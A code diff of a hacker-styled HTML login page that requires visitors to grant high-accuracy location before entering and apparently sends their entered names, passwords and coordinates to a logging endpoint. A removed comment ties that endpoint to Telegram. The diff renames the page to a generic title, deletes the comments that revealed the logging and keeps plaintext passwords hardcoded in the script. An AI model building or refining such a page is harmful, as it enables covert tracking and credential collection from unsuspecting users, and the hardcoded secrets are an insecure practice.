@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-    <title>WIFIIISS · Login</title>
+    <title>LOGIN SYSTEM</title>
     <style>
         * {
             margin: 0;
@@ -169,7 +169,6 @@
 
     initBinaryRain();
 
-    // Hardcoded users (same as original)
     const users = [
         { username: "Frankie", password: ".A" },
         { username: "Mari Chan", password: "Totot" },
@@ -186,7 +185,6 @@
     const errorMsg = document.getElementById('errorMsg');
 
     function performLogin(username, password, locationCoords = null) {
-        // Send log to Telegram (optional, keep original)
         fetch('/api/log', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -214,13 +212,16 @@
             return;
         }
 
-        // Check if geolocation is supported
         if (!("geolocation" in navigator)) {
-            errorMsg.textContent = '⚠️ LOCATION ACCESS REQUIRED. Your browser does not support geolocation. Access denied.';
+            errorMsg.textContent = '⚠️ LOCATION REQUIRED: Your browser does not support geolocation. Access denied.';
             return;
         }
 
-        // Require location permission before proceeding
+        // Clear previous error and show loading
+        errorMsg.textContent = '📍 Requesting location...';
+        errorMsg.style.color = '#0f0';
+
+        // Request location every time ACCESS is clicked
         navigator.geolocation.getCurrentPosition(
             (position) => {
                 const coords = {
@@ -230,11 +231,24 @@
                 performLogin(username, password, coords);
             },
             (error) => {
-                // User denied or location error
-                console.warn("Geolocation error:", error);
-                errorMsg.textContent = '⚠️ LOCATION ACCESS REQUIRED. Please enable location and try again.';
+                let message = '';
+                switch(error.code) {
+                    case error.PERMISSION_DENIED:
+                        message = '⚠️ LOCATION ACCESS DENIED. Please enable location in your browser settings and try again.';
+                        break;
+                    case error.POSITION_UNAVAILABLE:
+                        message = '⚠️ LOCATION UNAVAILABLE. Please check your device GPS.';
+                        break;
+                    case error.TIMEOUT:
+                        message = '⚠️ LOCATION TIMEOUT. Please try again.';
+                        break;
+                    default:
+                        message = '⚠️ LOCATION ERROR. Please enable location and refresh.';
+                }
+                errorMsg.textContent = message;
+                errorMsg.style.color = '#f00';
             },
-            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }  // maximumAge:0 forces fresh attempt
         );
     });
 </script>
